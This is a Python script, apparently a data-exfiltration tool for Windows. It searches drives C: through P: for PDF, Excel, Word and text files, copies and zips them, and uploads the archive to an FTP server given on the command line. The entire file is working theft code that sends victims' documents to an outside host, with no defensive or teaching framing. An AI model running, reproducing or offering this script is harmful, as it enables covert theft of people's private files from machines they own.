import math
import time
import ftplib
import os
import shutil
import sys
import progressbar

args = sys.argv

# Parameters: IP, UserName, Password #

global IP, User, Pass
try:
    IP = str(sys.argv[1])
    User = str(sys.argv[2])
    Pass = str(sys.argv[3])
except:
    print("Please Provide Arguments in Format: filename FTP_IP FTP_Username FTP_password")
    sys.exit()

all_files = list()
errors = list()
copied = list()

drives = ["C:\\", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:"]

dir_blacklist = ["Windows", "Temp", "ProgramData", "Recovery", "AppData", "Boot", "Local Settings", "Application Data"]

for drive in drives:
    for root, dirs, files in os.walk(drive):
        dirs[:] = [d for d in dirs if d not in dir_blacklist]
        if len(root) == 0:
            pass
        else:
            for i in files:
                if i.endswith(".pdf") or i.endswith(".xlsx") or i.endswith(".doc") or i.endswith(".docx") or i.endswith(".txt"):
                    absp = os.path.join(root, i)
                    all_files.append(absp.replace(":", ":\\"))
                    
# print([i for i in all_files])

cwd = os.getcwd()
exfiltrate = str(cwd) + "\\exfiltrate\\"
try:
    if os.mkdir("exfiltrate"):
        print()
        print("Successfully created the exfiltration directory!")
        print()
except FileExistsError:
    print()
    print("Folder Already Exists!")
    print()

    pass


bar = progressbar.ProgressBar(max_value=len(all_files))
loader = 0
for files in all_files:
    loader += 1
    bar.update(loader)
    try:
        time.sleep(0.01)
        if shutil.copy(files, exfiltrate):
            copied.append(files)
            # print("Copied File ->", files)
    except PermissionError or shutil.Error as reason:
        # print("Error copying file -> ", files)
        # print(reason)
        errors.append(files)
        pass
print("-")
print("Total Files: ", len(all_files))
print("Successfully Copied: ", len(copied))
print("Copy Error: ", len(errors))
print("-")

try:
    print("Archiving Folder for Exfiltration")
    shutil.make_archive("exfiltrated", 'zip', exfiltrate)
    print()
except:
    print()

    print("Failed to process Archive")
    print()
global ftp
try:
    ftp = ftplib.FTP(IP)
    ftp.login(user=User, passwd=Pass)
    print()
    print("Logged In to FTP Server!")
except:
    print()
    print("Error Logging in to FTP Server")
    print()
try:
    print()
    print("Initiating Exfiltration!!!")
    file = open(cwd+"\\exfiltrated.zip", 'rb')
    ftp.storbinary(f"STOR exfiltrated.zip", file)
    print()
    print("Exfiltration Complete!!!")
except ftplib.all_errors as e:
    print()
    print("Error Transferring File! ")
    print()

print()
print("Quitting!!!")
print()
sys.exit()
